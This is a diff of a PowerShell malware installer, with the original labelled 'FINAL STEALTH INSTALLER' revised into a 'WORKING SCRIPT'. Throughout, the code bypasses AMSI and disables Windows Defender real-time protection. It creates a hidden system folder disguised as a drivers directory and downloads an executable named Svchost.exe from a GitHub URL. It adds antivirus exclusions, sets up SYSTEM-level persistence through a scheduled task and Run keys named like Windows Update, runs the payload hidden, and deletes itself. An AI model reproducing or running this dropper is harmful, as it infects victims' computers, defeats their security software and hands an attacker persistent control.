@@ -1,61 +1,38 @@
 # ============================================
-# FINAL STEALTH INSTALLER
+# WORKING SCRIPT - Registry Exclusions + Defender OFF/ON
 # ============================================
 
-# ============================================
-# STAGE 1: AMSI BYPASS
-# ============================================
+# AMSI BYPASS
 try {
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 } catch {}
 
-# ============================================
-# STAGE 2: DEFENDER OFF (25 Seconds)
-# ============================================
-Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\Drivers" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
+# DEFENDER OFF
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
-# ============================================
-# STAGE 3: HIDDEN FOLDER
-# ============================================
+# HIDDEN FOLDER
 $HiddenFolder = "$env:ProgramData\Microsoft\Windows\Drivers"
-if (!(Test-Path $HiddenFolder)) {
-    New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null
-}
+if (!(Test-Path $HiddenFolder)) { New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null }
 Set-ItemProperty -Path $HiddenFolder -Name Attributes -Value "Hidden, System"
 
 $RandomName = [System.Guid]::NewGuid().ToString().Substring(0, 12) + ".exe"
 $ExePath = Join-Path $HiddenFolder $RandomName
 
-# ============================================
-# STAGE 4: DOWNLOAD EXE
-# ============================================
+# DOWNLOAD EXE
 $DownloadUrl = "https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe"
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-    $wc.DownloadFile($DownloadUrl, $ExePath)
-} catch {
-    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing
-}
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0")
+$wc.DownloadFile($DownloadUrl, $ExePath)
 Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"
 
 # ============================================
-# STAGE 5: PERMANENT EXCLUSIONS
+# REGISTRY EXCLUSIONS (Using PowerShell MPPreference - No HKLM needed)
 # ============================================
-$regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-Set-ItemProperty -Path $regPath -Name $HiddenFolder -Value 0 -Type DWord -Force
+# Yeh Windows Defender ko directly add karta hai bina registry edit kiye
+Add-MpPreference -ExclusionPath $HiddenFolder -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess $RandomName -ErrorAction SilentlyContinue
 
-$regProcPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
-if (!(Test-Path $regProcPath)) { New-Item -Path $regProcPath -Force | Out-Null }
-Set-ItemProperty -Path $regProcPath -Name $RandomName -Value 0 -Type DWord -Force
-
-# ============================================
-# STAGE 6: AUTO-START (HIGHEST PRIVILEGE)
-# ============================================
-# Scheduled Task
+# AUTO-START
 $action = New-ScheduledTaskAction -Execute $ExePath
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
 $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -64,30 +41,18 @@ $taskName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 
 Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null
 
 # Registry Run
-$regRun = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+$regRun = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 $regName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
 Set-ItemProperty -Path $regRun -Name $regName -Value $ExePath -Force
 
-# ============================================
-# STAGE 7: START EXE
-# ============================================
+# START EXE
 Start-Process -FilePath $ExePath -WindowStyle Hidden
 
-# ============================================
-# STAGE 8: WAIT 25 SECONDS
-# ============================================
+# WAIT 25 SECONDS
 Start-Sleep -Seconds 25
 
-# ============================================
-# STAGE 9: DEFENDER BACK ON
-# ============================================
-try {
-    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
-} catch {}
+# DEFENDER BACK ON
+Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
 
-# ============================================
-# STAGE 10: DELETE SCRIPT
-# ============================================
-try {
-    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
-} catch {}
+# DELETE SCRIPT
+Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
